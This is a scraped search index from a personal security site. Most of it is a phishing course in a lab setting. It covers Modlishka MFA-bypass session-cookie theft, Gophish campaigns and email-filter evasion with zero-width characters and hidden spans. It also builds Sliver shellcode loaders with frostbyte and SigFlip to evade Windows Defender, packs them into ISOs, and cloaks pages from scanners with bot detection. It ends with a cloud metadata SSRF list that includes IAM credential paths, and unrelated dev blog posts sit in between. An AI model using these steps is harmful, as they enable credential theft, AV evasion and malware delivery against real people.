\"InVpZF9maWVsZCI6XHMqIiguKz8pIg==,InBhc3N3b3JkIjpccyoiKC4rPyki\" Finally, we need to update the \"terminateTriggers\" and \"terminateRedirectUrl\".\n\"terminateRedirectUrl\": \"https://uvcyber.com/?phished\", \"terminateTriggers\": \"/if/user\", ","categories":"","description":"","excerpt":"Let’s go through the authentication flow to determine what the …","ref":"/docs/phishing-credential-harvesting-and-beyond/75-reconfigure-modlishka/","tags":"","title":"Reconfigure Modlishka With MFA Authentication Provider"},{"body":"Open up a new private browsing window, then visit http://modlishka.docker/?rid=test0001. We’ll make up a fake rid value to help us track our progress.\nGo through the authentication flow. You can Modlishka seamlessly handles the redirects and the MFA authentication flow.\nSo we are stuck at a loading screen. this is because we hit the terminate trigger URL while loading a page.\nIf we refresh the page we’ll get redirected to our termination URL. Kind of jarring, but still acceptable.\nNow that we’ve completed our login, lets check out the Modlishka data. Open http://modlishka.docker/livewell/, login with the credentials we configured (phisherman:phisherpass).\nClick View Cookies on our testing UUID.\nNow we can copy the value of the authentik_session cookie. Open http://auth.target.docker:9000 in a new private browsing window, and update the cookie value using developer tools.\nOnce completed, visit the root URL again http://auth.target.docker:9000/\nWe are now logged in as the target.\n","categories":"","description":"","excerpt":"Open up a new private browsing window, then visit …","ref":"/docs/phishing-credential-harvesting-and-beyond/80-testing-modlishka-mfa-bypass/","tags":"","title":"Test Modlishka MFA Bypass"},{"body":"Now we can go back to Gophish, clone our first credential harvesting campaign, modify the URL to point to Modlishka (http://modlishka.docker).\nThis will break Gophish’s Opened, Clicked, and Data Captured analytics. We can fix those later, but for now we’ll just keep moving forward.\nIf we click on it, we can see in our Modlishka livewell page, we can see our target’s RID.\nFeel free to go through the whole flow. It shouldn’t be any different from the previous step besides the fact we are opening the link from an email instead of directly browsing to it.\n","categories":"","description":"","excerpt":"Now we can go back to Gophish, clone our first credential harvesting …","ref":"/docs/phishing-credential-harvesting-and-beyond/85-not-so-basic-phishing/","tags":"","title":"Not So Basic Credential Harvesting"},{"body":" Bypassing Email FilteringA lot of times emails will be quarantined based on content. We can trick them by injecting invisible characters and html elements into our messages.\nWe can use a Zero Width Joiner ref to assist in this. simply pasting the character in the middle of problematic words should do the trick.\nWe can also use the \u003cspan\u003e HTML element to help us out by breaking up problematic words and phrases.\nText:\nAll, We are up‍grad‍ing the sec‍urity around our au‍thent‍ication serv‍ices. Please lo‍g‍in ({{.URL}}) to ena‍ble these new feat‍ures. Tha‍nks - Guy Withaface IT You can’t tell the difference just by looking at it. However, if we open it up in vim we can see the difference.\nAll, We are up\u003c200d\u003egrad\u003c200d\u003eing the sec\u003c200d\u003eurity around our au\u003c200d\u003ethent\u003c200d\u003eication serv\u003c200d\u003eices. Please lo\u003c200d\u003eg\u003c200d\u003ein ({{.URL}}) to ena\u003c200d\u003eble these new feat\u003c200d\u003eures. Tha\u003c200d\u003enks - Guy Withaface IT HTML:\n\u003chtml\u003e \u003chead\u003e \u003ctitle\u003e\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cp\u003eAll,\u003c/p\u003e \u003cp\u003eWe are \u003cspan\u003eup\u003cspan style=\"display:none\"\u003estairs searching for the holy\u003c/span\u003egr\u003c/span\u003e\u003cspan style=\"display:none\"\u003erail and are f\u003c/span\u003eading the se\u003cspan style=\"display:none\"\u003eearch for \u003c/span\u003e\u003cspan\u003ecur\u003c/span\u003e\u003cspan style=\"display:none\"\u003ery in the c\u003c/span\u003eity around our au\u003cspan style=\"display:none\"\u003edio and \u003c/span\u003e\u003cspan\u003ethen\u003c/span\u003e\u003cspan style=\"display:none\"\u003e have a pizza party\u003c/span\u003etication ser\u003cspan\u003evice\u003c/span\u003es. Please \u003ca href=\"{{.URL}}\"\u003elo\u003cspan\u003egin\u003c/span\u003e to en\u003cspan\u003eable thes\u003c/span\u003ee new features\u003c/a\u003e.\u003c/p\u003e \u003cp\u003eThanks\u003c/p\u003e \u003c/body\u003e \u003c/html\u003e ","categories":"","description":"","excerpt":" Bypassing Email FilteringA lot of times emails will be quarantined …","ref":"/docs/phishing-credential-harvesting-and-beyond/100-email-filtering-bypass/","tags":"","title":"Email Filtering Bypass"},{"body":" Terminate to implant downloadWe can set our terminationURL to a place where we are hosting our windows implant. This will require them to authenticate then be redirected to a file download page.\nAdd our newly generated payload to the NGINX container.\nCreate a landing page html to be our termination URL. We can use this to execute some js to make sure the target is running windows before we download the file.\nupdate modlishka’s termination URL.\nTODO: Screenshot\nTest it out with Modlishkla\nsudo docker compose up Create a new campaign and test it out.\n","categories":"","description":"","excerpt":" Terminate to implant downloadWe can set our terminationURL to a place …","ref":"/docs/phishing-credential-harvesting-and-beyond/105-terminate-to-implant-download/","tags":"","title":"Modlishka Terminate to Implant Download"},{"body":" Better implants (frostbyte bypass windows defender)Instead of generating an executable. We can generate shellcode. We can then use something like https://github.com/pwn1sher/frostbyte to load that shellcode into memory and execute it.\nGet frostbyteDownload the frostbyte zip from GitHub.\nGenerate shellcodeIn a sliver shell we need to run the following to generate some shellcode to be used later. We’ll use test.example as the callback domain, we will add an entry to the Windows hosts file.\ngenerate --mtls test.example -f shellcode --save implants/shellcodex64.bin Copy the shell code to the share.\nmkdir -p /share/operator-$(ip a | grep 172 | awk '{print $2}' | cut -d/ -f1 | cut -d. -f4) cp implants/shellcodex64.bin /share/operator-$(ip a | grep 172 | awk '{print $2}' | cut -d/ -f1 | cut -d. -f4) It is time to switch to windows.\nCopy the shellcode to your Desktop\\frostbyte-main folder on the Windows machine.\nSetup Files for New Payloadcd Desktop\\frostbyte-main mkdir AuthHelper mkdir AuthHelper\\dist\\ copy Update.exe.config AuthHelper\\dist\\AuthHelper.exe.config copy test.cs AuthHelper\\AuthHelper.cs cd AuthHelper Run SigFlipNow that we have things setup we can run SigFlip to encode our shellcode into the CasPol.exe and save it as AuthHelper.exe in our newly created AuthHelper folder.\n..\\SigFlip.exe -i \"..\\CasPol.exe\" \"..\\shellcodex64.bin\" \".\\dist\\AuthHelper.exe\" \"PYLD4ME\" Pay attention to the output. I had to make note of the padding value and add it to two lines in the .cs file\nUpdate dist\\AuthHelper.exe.config We need to replace test with our executable name our executable name without the extension (AuthHelper). Next we need to update the value of appDomainManagerType to be something else NewAuthHelper. Finally lets make privatePath a relative path . \u003cconfiguration\u003e \u003cruntime\u003e \u003cassemblyBinding xmlns=\"urn:schemas-microsoft-com:asm.v1\"\u003e \u003cprobing privatePath=\".\"/\u003e \u003c/assemblyBinding\u003e \u003cappDomainManagerAssembly value=\"AuthHelper, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null\" /\u003e \u003cappDomainManagerType value=\"NewAuthHelper\" /\u003e \u003c/runtime\u003e \u003c/configuration\u003e Update AuthHelper\\AuthHelper.csNow we need to update the AuthHelper.cs file.\nremove top three lines prepended with # replace Z45UDG with NewAuthHelper comment out logging on lines 154 and 161 replace S3cretK3y with PYLD4ME change Z:\\\\zloader\\\\update.exe to AuthHelper.exe replace all instances of shellcode with certData replace all instances of ClassExample with AuthHelper replace all instances of Executing Beacon! with Begin Execution! replace all instances of Decrypt with CheckAuth replace all instances of ExecShellcode with Authorize Update _peBlob.Length+2 to be _peBlob.Length+10 C:\\windows\\Microsoft.NET\\Framework\\v3.5\\csc.exe /target:library /out:dist\\AuthHelper.dll AuthHelper.cs Prepare for TestingWe need to modify C:\\Windows\\System32\\drivers\\etc\\hosts and add an entry for test.example.\nRun notepad as administrator Ensure you have All Files selected Browse to C:\\Windows\\System32\\drivers\\etc\\\nAdd en entry for test.example to go to your Linux box running sliver. We should also set defender to not send off samples.\nOpen Windows Defender Select Virus \u0026 threat protection from the left side navigation.\nClick Manage settings Turn off sample submission TestingNow we should be able to open out dist folder and run the AuthHelper.exe. We should see a new session popup in Sliver Now would be a good time to fine tune our code, remove debugging messages, or add a nice special message that says “Good job! Now your more secure!!”.\nPackMyPayloadNow that we have a nice payload, lets pack it up so we can send it to our phishing targets. We’ll use https://github.com/mgeeky/PackMyPayload\nsudo apt install python3-pip cd ~/opt git clone https://github.com/mgeeky/PackMyPayload.git cd PackMyPayload python3 -m pip install -r requirements.txt Copy dist folder to your linux VM. I put it in ~/Desktop/op/payloads/AuthHelper/.\ncd ~/Desktop/op/payloads/AuthHelper python3 ~/opt/PackMyPayload/PackMyPayload.py --hide AuthHelper.dll,AuthHelper.exe.config dist AuthHelper.iso -v Now we should have a nice .iso file we can send users. Testing… AgainNow we need to test again to make sure everything is working as designed. Copy the AuthHelper.iso to the Windows machine. We’d hate for users to receive this message instead of us getting a new session:\n","categories":"","description":"","excerpt":" Better implants (frostbyte bypass windows defender)Instead of …","ref":"/docs/phishing-credential-harvesting-and-beyond/110-better-payload/","tags":"","title":"Better Payload Generation"},{"body":" What are bots?Bots are usually headless browsers that visit links in email and analyze them for threats. This includes looking for logins, especially popular ones that are not on the correct domain. We need a reliable way to determine if a request is coming from a real user or a bot.\nHow can we detect bots?To do this we can use javascript to inspect the browser that is visiting our page. There are a number of decent articles out there on how to do this. We’ll use at minimum to detect urlscan.io.\nExample test script for enumerating bots. We are using urlscan.io to screenshot it and read the output. However, if we were testing email bots, we’d probably want to send this information to a server so we could analyze it.\n\u003cscript\u003e function botCheck(isBotFn, isNotBotFn) { let dumbtimeoutRan = false; window.setTimeout(function () { dumbtimeoutRan = true; }, 1500); let defaultTimeout = 1200; let startTime = new Date().getTime(); window.setTimeout(function () { let execTime = new Date().getTime(); let timeoutDiff = execTime - startTime; // Check notifications navigator.permissions.query({name: 'notifications'}).then(function (permissionStatus) { let data = { notificationsDisabled: Notification.permission === 'denied' \u0026\u0026 permissionStatus.state === 'prompt' \u0026\u0026 1, headlessUA: /HeadlessChrome/.test(window.navigator.userAgent), timeoutDiff: timeoutDiff, defaultTimeout: defaultTimeout, dumbtimeoutRan: dumbtimeoutRan, evalString: eval.toString().length, screenOffset: window.screenX + window.screenY, windowwidth: window.screen.width, windowheight: window.screen.height, windowavailWidth: window.screen.availWidth, windowavailHeight: window.screen.availHeight, windowavailTop: window.screen.availTop, windowavailLeft: window.screen.availLeft, windowcolorDepth: window.screen.colorDepth, windowpixelDepth: window.screen.pixelDepth, userAgent: window.navigator.userAgent, } document.write(JSON.stringify(data).replaceAll(',\"', ',\u003cbr\u003e\"')) }); }, defaultTimeout); } botCheck(handleBot, handleNotBot); \u003c/script\u003e We’ve collected some decent metrics from the URL scan headless browser. We can see that the screen offset it 0. This means that the browser is in the top left corner of the desktop. We’ll use that as our simple check for now. However, many mobile browsers will report the same thing, so this isn’t a catch-all solution. We’d need to spend some time capturing metrics from different bots and real browsers to come up with a decent bot detector.\nNow we’ll simplify our Javascript to just what we need.\n\u003cscript\u003e function botCheck(isBotFn, isNotBotFn) { let isBot = window.screenX + window.screenY; if (isBot) { isBotFn.call(window, 1) } else { isNotBotFn.call(window, data) } } function handleBot(data) { // only bots should execute this document.write(\"hi bot!\") } function handleNotBot(data) { // Non-bots should execute this. document.write(\"Hello Human!\") } botCheck(handleBot, handleNotBot); \u003c/script\u003e ","categories":"","description":"","excerpt":" What are bots?Bots are usually headless browsers that visit links in …","ref":"/docs/phishing-credential-harvesting-and-beyond/120-bot-detection/","tags":"","title":"Bot Detection"},{"body":" Traefik Reverse ProxyNow that we have a reliable way to detect bots, we need to be able to make that determination before showing the phishing page. Then we can show bots simple non-malicious content and users will get our phishing pages. We can do this using traefik to route requests based on cookies. We can put traefik in front of Modlishka and force all request to go through a simple bot check before loading our phishing site.\nWe’ll start by adding a new Traefik container.\nThen we’ll add a new NGINX container to serve our bot detection landing page.\nNow we can create our bot detection landing page\npaste the content:\nAdd some additional configuration to the modlishka container so Traefik can act as a proxy for it.\nNow we can test it out.\nsudo docker compose up Now we can use our new traefik URL as our Gophish URL in a phishing campaign.\n","categories":"","description":"","excerpt":" Traefik Reverse ProxyNow that we have a reliable way to detect bots, …","ref":"/docs/phishing-credential-harvesting-and-beyond/125-traefik-reverse-proxy/","tags":"","title":"Traefik Reverse Proxy"},{"body":" THIS IS A ROUGH OUTLINE OF WHAT NEEDS TO BE FINISHED\nWhat needs to change for live assessmentsNow we have a decent understanding of our current capabilities. How can we successfully execute this for reals?\nWe need the following:\nA domain to send emails from. A domain to host malicious content. Could be the same, but it’s nice have them separate in case one is burned. TLS Certs. A target and their permission. DomainsWe like to use Amazon’s Route53 for a number of reasons:\nIt is pretty simple to acquire domains. Supports automation via APIs. Tooling support. Gophish: Sending Emails FRDNow we want to send real emails. We have quite a few options to do this. Our typical workflow is to use Amazon SES, but there are other options. Any service that supports SMTP should work.\nSES Gmail Shared hosting (godaddy) Manually setting up postfix It should be as simple as the MailHog setup, but using the required credentials…\nTraefik TLSTraefik can generate all the certs you need, it just needs an API key to manage DNS records on your domains.\nWhere to from here? Automate VM Build. Automate infrastructure deployment. ","categories":"","description":"","excerpt":" THIS IS A ROUGH OUTLINE OF WHAT NEEDS TO BE FINISHED\nWhat needs to …","ref":"/docs/phishing-credential-harvesting-and-beyond/200-wrap-up/","tags":"","title":"Wrap up"},{"body":"I have been wanting to do more mobile app development and streamline the release process for a while now. I read a few things on how to publish to the Play Store with GitHub actions, but I kept running into issues. I’ll try to document what the issues were and how I was able to get past them.\nI am using https://github.com/r0adkll/upload-google-play to publish actions. To make testing easier, I used https://github.com/nektos/act to run my GitHub actions locally. I used the largest docker image, since the other ones didn’t seem to have what I needed for Android builds.\nFirst Issue Error: Unknown error occurred.The first issue I ran into was: Error: Unknown error occurred.. There a few issues filed about this error. The consensus is to check that your are referencing your secrets with the appropriate variable names and config options.\nI checked out the https://github.com/r0adkll/upload-google-play repo and manually invoked lib/index.js to quickly test my configs worked.\ngit clone https://github.com/r0adkll/upload-google-play.git I had to dig into how actions are executed and how the arguments are passed to the action. It turns out, they all become environment variables prefixed with INPUT_. My invocation looked something like this:\nINPUT_PACKAGENAME=example.package.name \\ INPUT_TRACK=production \\ INPUT_SERVICEACCOUNTJSONPLAINTEXT=$(cat ~/Downloads/google-cloud-credentials.json | jq -c) \\ INPUT_STATUS=completed \\ INPUT_RELEASEFILES=$HOME/flutter-project-dir/build/app/outputs/flutter-apk/app-release.apk \\ INPUT_DEBUG=1 \\ node lib/index.js This helped me confirm/determine my secrets were being referenced incorrectly.\nSecond Issue You cannot rollout this release because it does not allow any existing users to upgrade to the newly added APKs.This one didn’t make sense, so I switched to doing a draft release. So I could inspect the release from the Play Console. Turns out that my efforts to support WearOS made it so I could not support Android phones. This meant none of the android phones using my app would not be able to upgrade to the new version. So I ended up reverting my app support for WearOS. I’ll have to figure out how to support watches and phones later.\n","categories":"","description":"Embracing continuous delivery\n","excerpt":"Embracing continuous delivery\n","ref":"/blog/2025/10/31/publish-flutter-app-to-google-play-using-github-actions/","tags":"","title":"Publish Flutter App to Google Play Using GitHub Actions"},{"body":"I try to like python. I really do. I attempt to use it and be like all the other cool people. Sadly, I am a dumb python noob. I see an import like:\nfrom Crypto.Cipher import AES Cool, lets install the crypto pacakge…\npip install crypto It returns command not found: pip, fair enough. I am not a python dev, my environment isn’t setup. Lets run the module.\npython3 -m pip install crypto More errors:\nerror: externally-managed-environment × This environment is externally managed ╰─\u003e To install Python packages system-wide, try brew install xyz, where xyz is the package you are trying to install. If you wish to install a Python library that isn't in Homebrew, use a virtual environment: python3 -m venv path/to/venv source path/to/venv/bin/activate python3 -m pip install xyz If you wish to install a Python application that isn't in Homebrew, it may be easiest to use 'pipx install xyz', which will manage a virtual environment for you. You can install pipx with brew install pipx You may restore the old behavior of pip by passing the '--break-system-packages' flag to pip, or by adding 'break-system-packages = true' to your pip.conf file. The latter will permanently disable this error. If you disable this error, we STRONGLY recommend that you additionally pass the '--user' flag to pip, or set 'user = true' in your pip.conf file. Failure to do this can result in a broken Homebrew installation. Read more about this behavior here: \u003chttps://peps.python.org/pep-0668/\u003e note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages. hint: See PEP 668 for the detailed specification. Ok, I guess venv’s are no longer a suggestion and instead a way of life.\nmkdir -p ~/python-sucks/venv-for-crypto python3 -m venv ~/python-sucks/venv-for-crypto source ~/python-sucks/venv-for-crypto/bin/activate hey it works!\nCollecting crypto Using cached crypto-1.4.1-py2.py3-none-any.whl.metadata (3.4 kB) Collecting Naked (from crypto) Using cached Naked-0.1.32-py2.py3-none-any.whl.metadata (931 bytes) Collecting shellescape (from crypto) Using cached shellescape-3.8.1-py2.py3-none-any.whl.metadata (2.8 kB) Collecting requests (from Naked-\u003ecrypto) Using cached requests-2.32.3-py3-none-any.whl.metadata (4.6 kB) Collecting pyyaml (from Naked-\u003ecrypto) Using cached PyYAML-6.0.2-cp313-cp313-macosx_11_0_arm64.whl.metadata (2.1 kB) Collecting charset-normalizer\u003c4,\u003e=2 (from requests-\u003eNaked-\u003ecrypto) Using cached charset_normalizer-3.4.1-cp313-cp313-macosx_10_13_universal2.whl.metadata (35 kB) Collecting idna\u003c4,\u003e=2.5 (from requests-\u003eNaked-\u003ecrypto) Using cached idna-3.10-py3-none-any.whl.metadata (10 kB) Collecting urllib3\u003c3,\u003e=1.21.1 (from requests-\u003eNaked-\u003ecrypto) Using cached urllib3-2.3.0-py3-none-any.whl.metadata (6.5 kB) Collecting certifi\u003e=2017.4.17 (from requests-\u003eNaked-\u003ecrypto) Using cached certifi-2024.12.14-py3-none-any.whl.metadata (2.3 kB) Using cached crypto-1.4.1-py2.py3-none-any.whl (18 kB) Using cached Naked-0.1.32-py2.py3-none-any.whl (587 kB) Using cached shellescape-3.8.1-py2.py3-none-any.whl (3.1 kB) Using cached PyYAML-6.0.2-cp313-cp313-macosx_11_0_arm64.whl (171 kB) Using cached requests-2.32.3-py3-none-any.whl (64 kB) Using cached certifi-2024.12.14-py3-none-any.whl (164 kB) Using cached charset_normalizer-3.4.1-cp313-cp313-macosx_10_13_universal2.whl (195 kB) Using cached idna-3.10-py3-none-any.whl (70 kB) Using cached urllib3-2.3.0-py3-none-any.whl (128 kB) Installing collected packages: shellescape, urllib3, pyyaml, idna, charset-normalizer, certifi, requests, Naked, crypto Successfully installed Naked-0.1.32 certifi-2024.12.14 charset-normalizer-3.4.1 crypto-1.4.1 idna-3.10 pyyaml-6.0.2 requests-2.32.3 shellescape-3.8.1 urllib3-2.3.0 Lets have some fun and start writing python.\nfrom Crypto.Cipher import AES Sadness…\nTraceback (most recent call last): File \"\u003cpython-input-0\u003e\", line 1, in \u003cmodule\u003e from Crypto.Cipher import AES ModuleNotFoundError: No module named 'Crypto' cant find the Crypto module. oh hey. I am on a mac, I guess i need some special hacks. I seen this in some random code.\nimport sys import crypto sys.modules[\"Crypto\"] = crypto from Crypto.Cipher import AES More Sadness…\nTraceback (most recent call last): File \"\u003cpython-input-5\u003e\", line 1, in \u003cmodule\u003e from Crypto.Cipher import AES ModuleNotFoundError: No module named 'Crypto.Cipher' oh, this is for the Crypto.Cipher. Lets look at our package.\nls ~/python-sucks/venv-for-crypto/lib/python3.13/site-packages/crypto hrmm. no cipher folder.\n__init__.py __pycache__ app.py decryptoapp.py library settings.py oh hey. I think I need pycrypto instead of crypto.\npython3 -m pip install pycrypto Lets see if it works\nimport sys import crypto sys.modules[\"Crypto\"] = crypto from Crypto.Cipher import AES yay! it does. it feels wrong. what did this just do? it installed pycrypto package in the existing crypto folder? yes it did. hooray for case insensitive file systems combined with removing the py prefix on the installed module.\nLets create a new venv and install the right module.\nmkdir -p ~/python-sucks/venv-for-crypto-2 python3 -m venv ~/python-sucks/venv-for-crypto-2 source ~/python-sucks/venv-for-crypto-2/bin/activate python3 -m pip install pycrypto and finally try just the initial line that started this adventure.\nfrom Crypto.Cipher import AES Yes! It works the way it should.\n","categories":"","description":"Attempting to embrace Python\n","excerpt":"Attempting to embrace Python\n","ref":"/blog/2025/01/09/adventures-in-python/","tags":"","title":"Adventures in Python"},{"body":"","categories":"","description":"Reviewing PHP code for security issues.\n","excerpt":"Reviewing PHP code for security issues.\n","ref":"/docs/code-review/05-php/","tags":"","title":"PHP Code Review"},{"body":"I have been using Packer for quite a while. However, all my interactions have used JSON instead of HCL. I wanted to set up a new build using HCL, VirtualBox, and Ubuntu 24.04. I am going to attempt to create documentation for using HCL with VirtualBox to build a custom image based on the latest Ubuntu LTS release (with cloud init).\nIn my research I found some decent guides that did most of what I wanted. I’ll use these a reference for building my specific use case.\nQEMU: https://github.com/shantanoo-desai/packer-ubuntu-server-uefi/tree/main VMWare: https://github.com/ynlamy/packer-ubuntuserver24_04/blob/main/vmware-iso-ubuntuserver24_04.pkr.hcl The official docs will also come in handy and can be found here: https://developer.hashicorp.com/packer/integrations/hashicorp/virtualbox.\n# virtualbox.pkr.hcl packer { required_version = \"\u003e= 1.7.0\" required_plugins { virtualbox = { version = \"~\u003e 1\" source = \"github.com/hashicorp/virtualbox\" } ansible = { version = \"\u003e= 1.1.1\" source = \"github.com/hashicorp/ansible\" } } } source \"virtualbox-iso\" \"packer-vm-ubuntu\" { guest_os_type = \"Ubuntu_64\" iso_url = \"https://releases.ubuntu.com/noble/ubuntu-24.04-live-server-amd64.iso\" iso_checksum = \"sha256:8762f7e74e4d64d72fceb5f70682e6b069932deedb4949c6975d0f0fe0a91be3\" http_directory = \"./http/24.04/\" ssh_username = \"packer\" ssh_password = \"packer\" ssh_timeout = \"10m\" shutdown_command = \"echo 'packer' | sudo -S shutdown -P now\" headless = false firmware = \"efi\" boot_command = [\"e\u003cwait\u003e\u003cdown\u003e\u003cdown\u003e\u003cdown\u003e\u003cend\u003e autoinstall 'ds=nocloud-net;s=http://{{ .HTTPIP }}:{{ .HTTPPort }}/'\u003cF10\u003e\"] boot_wait = \"5s\" vboxmanage = [ [ \"modifyvm\", \"{{.Name}}\", \"--memory\", \"4096\" ], [ \"modifyvm\", \"{{.Name}}\", \"--cpus\", \"4\" ], [ \"modifyvm\", \"{{.Name}}\", \"--nat-localhostreachable1\", \"on\" ] ] } # build { # sources = [\"sources.virtualbox-iso.packer-vm-ubuntu\"] # # provisioner \"ansible\" { # playbook_file = \"../../ansible/ubuntu-desktop.yaml\" # } # } I’d like to point out a few things. First the http_directory property specifies a directory to be exposed via HTTP. This will be consumed by cloud-init. We’ll use that to create our initial user.\nIn the out http_directory we’ll need to create two files.\nmeta-data user-data We’ll leave meta-data empty, if it is not there, cloud-init will refuse to consume our user-data file.\n#cloud-config autoinstall: version: 1 locale: en_US keyboard: layout: us ssh: install-server: true allow-pw: true packages: - zsh updates: all late-commands: - | if [ -d /sys/firmware/efi ]; then apt-get install -y efibootmgr efibootmgr -o $(efibootmgr | perl -n -e '/Boot(.+)\\* Ubuntu/ \u0026\u0026 print $1') fi user-data: preserve_hostname: false hostname: carbon package_upgrade: true timezone: UTC users: - name: packer # passwd must be a password hash, you can generate it with `openssl passwd -6 replacewithyourpassword` passwd: $6$ZfIbBMQd5rmGTGPk$AWrvIL1v4Xq6jsSR72KsSONa2VpSnr8SZHPDF2l6pNNcQ3HKjqWF2JEBYepl4LnnmzKiKFEcRuf7lfyOMooq50 groups: [adm, cdrom, dip, plugdev, lxd, sudo] lock-passwd: false sudo: ALL=(ALL) NOPASSWD:ALL shell: /bin/zsh Now we should be able to build our VM using VirtualBox.\npacker build virtualbox.pkr.hcl If you have an ansible playbook, you can reference it in the build section.\n","categories":"","description":"Adventures with automating VM builds\n","excerpt":"Adventures with automating VM builds\n","ref":"/blog/2024/08/31/packer-ubuntu-noble-and-virtualbox/","tags":"","title":"Packer, Ubuntu Noble, and VirtualBox"},{"body":"I recently (not that recent) discovered the Docsy theme for Hugo. After playing with it on a few mini projects, I have decided to migrate this site to use it. I imagine I will slowly start migrating other things to it as well.\n","categories":"","description":"Migrating to the Docsy hugo theme.\n","excerpt":"Migrating to the Docsy hugo theme.\n","ref":"/blog/2024/08/27/adopting-docsy-theme/","tags":"","title":"Adopting Docsy Theme"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/phishing/","tags":"","title":"Phishing"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/saintcon/","tags":"","title":"SaintCON"},{"body":"I’ve been working on a phishing training for SAINTCON. I used this to brainstorm how I wanted the network laid out.\nNetwork Diagramflowchart TB wifi--\u003eopnet subgraph labnet [FakeNet] direction TB subgraph corpnet [Corp Network] subgraph corpnetprod [Production Network] smtp[Corporate Web Site] www[Corporate Web Site] webapp[product] end subgraph corpnetinternal [Internal Network] corpuser[Corp User] codehosting[Code Server] end end subgraph wifi [Guest Network] operator001(\"Operator Physical Machines\") end subgraph opnet [Op Network] op001(\"Operations VMs\") end opnet--\u003ecorpnetprod; corpnetinternal\u003c--\u003ecorpnetprod; end Work FlowsstateDiagram-v2 [*] --\u003e Onboard Onboard --\u003e OSINT OSINT --\u003e InfrastructureDev InfrastructureDev --\u003e CampaignDevelopment CampaignDevelopment --\u003e Test Test --\u003e Phish state Onboard { [*] --\u003e ConnectNet ConnectNet --\u003e AccessVM AccessVM --\u003e ReadDocs ReadDocs --\u003e [*] } state OSINT { [*] --\u003e SearchEngines [*] --\u003e CrunchBase [*] --\u003e LinkedIn [*] --\u003e CodeHosting [*] --\u003e DNSRecon [*] --\u003e MailServers [*] --\u003e LoginPages SearchEngines --\u003e [*] CrunchBase --\u003e [*] LinkedIn --\u003e [*] CodeHosting --\u003e [*] DNSRecon --\u003e [*] MailServers --\u003e [*] LoginPages --\u003e [*] } state InfrastructureDev { SpinUpServices : Spin up Services PointDomains : Point Domains StaticSite : Static Site [*] --\u003e SpinUpServices SpinUpServices --\u003e PointDomains SpinUpServices --\u003e Modlishka SpinUpServices --\u003e Gophish SpinUpServices --\u003e StaticSite Modlishka --\u003e [*] Gophish --\u003e [*] StaticSite --\u003e [*] PointDomains --\u003e [*] } state CampaignDevelopment { [*] --\u003e EmailTemplates [*] --\u003e PayloadCreation EmailTemplates --\u003e TestCampaigns PayloadCreation --\u003e TestCampaigns TestCampaigns --\u003e [*] } state Test { [*] --\u003e SendTestEmail SendTestEmail --\u003e TestCredHarvesting TestCredHarvesting --\u003e TestPayload TestPayload --\u003e [*] } state Phish { [*] --\u003e ScheduleCampaign ScheduleCampaign --\u003e WaitForCreds ScheduleCampaign --\u003e WaitForCallback WaitForCreds --\u003e TakeOverSession TakeOverSession --\u003e AuthenticatedPostExploitation WaitForCallback --\u003e InternalPostExploitation InternalPostExploitation --\u003e [*] AuthenticatedPostExploitation --\u003e [*] } ","categories":"","description":"","excerpt":"I’ve been working on a phishing training for SAINTCON. I used this to …","ref":"/blog/2023/09/30/saintcon-training/","tags":["Phishing","Training","SaintCON"],"title":"SaintCON Training"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/","tags":"","title":"Tags"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/training/","tags":"","title":"Training"},{"body":"You can use a Yubikey to unlock your KeePassXC database. You’ll need to configure one of you Yubikey’s slots to use HMAC Challenge Response.\n","categories":"","description":"A useless page that needs to be updated or deleted.","excerpt":"A useless page that needs to be updated or deleted.","ref":"/docs/use-yubikey-with-keypassxc/","tags":"","title":"Use Yubikey With KeePassXC"},{"body":" Requirements KeePassXC aws-cli secret-tool Add a new group to KeePassXCThis will be used so we can control what secrets get exposed to the FreeDesktop.org Secret Service.\nRight-Click the Root folder group Select New Group Give it a Name Click OK Enable Freedesktop.org Secret Service IntegrationOpen KeePassXC Settings.\nSelect Secret Service from the left hand side (it may be cut off). Check the Enable KeePassXC Freedesktop.org Secret Service Integration. Click the pencil next to your kbdx file. Expose group to secret service Select Secret Service on the left hand side. Select Expose entries under this group. Select the group we created earlier. Click OK Add Secrets to KeePassXCCreate some JSON with your AWS Credentials\n{ \"Version\": 1, \"AccessKeyId\": \"AKIA-REPLACE-ME\", \"SecretAccessKey\": \"REPLACE ME\" } Select your group Click the Create New Entry icon Set the Title something meaningful Paste your JSON in the password field Click OK Configure AWS CLI to use custom programEdit your ~/.aws.config\n[profile default] region = us-east-2 output=json credential_process=secret-tool lookup Title \"aws-creds\" Test it out!Running the AWS CLI should now trigger a KeePassXC prompt.\naws s3 ls ","categories":"","description":"How to setup and use AWS credentials stored in KeePassXC","excerpt":"How to setup and use AWS credentials stored in KeePassXC","ref":"/docs/use-aws-credentials-stored-in-keepassxc/","tags":"","title":"Use AWS Credentials Stored in KeePassXC"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/curl/","tags":"","title":"Curl"},{"body":"If you append h to your socks5 protocol prefix when using --proxy the DNS resolution happens on the other side of the socks proxy!\ncurl --proxy socks5h://127.0.0.1:1080 http://internal-host ","categories":"","description":"","excerpt":"If you append h to your socks5 protocol prefix when using --proxy the …","ref":"/blog/2021/02/17/curl-resolve-dns-through-proxy/","tags":["curl","socks","DNS"],"title":"Curl Resolve DNS through Proxy"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/dns/","tags":"","title":"DNS"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/socks/","tags":"","title":"Socks"},{"body":" Alibabahttp://100.100.100.200/latest/meta-data/ http://100.100.100.200/latest/meta-data/instance-id http://100.100.100.200/latest/meta-data/image-id References\nhttps://www.alibabacloud.com/help/faq-detail/49122.htm AWShttp://169.254.169.254/latest/user-data http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/iam/security-credentials/ http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/ami-id http://169.254.169.254/latest/meta-data/reservation-id http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key http://169.254.169.254/ http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/meta-data/public-keys/ ECS 